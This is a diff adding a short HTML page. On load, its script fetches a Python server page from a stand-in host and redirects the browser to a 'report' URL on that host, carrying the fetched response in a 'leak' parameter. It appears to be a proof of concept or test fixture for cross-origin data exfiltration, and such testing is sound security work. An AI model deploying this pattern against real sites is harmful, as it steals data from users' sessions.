@@ -1,0 +1,11 @@
+<html>
+    <body>
+        <script>
+            (async () => {
+                const res = await fetch('https://a.test/Support/PythonServer/py-server/');
+                const x = await res.text();
+                document.location = `https://a.test/report/?leak=PythonServer&response=${encodeURIComponent(JSON.stringify(x))}`;
+            })();
+        </script>
+    </body>
+</html>
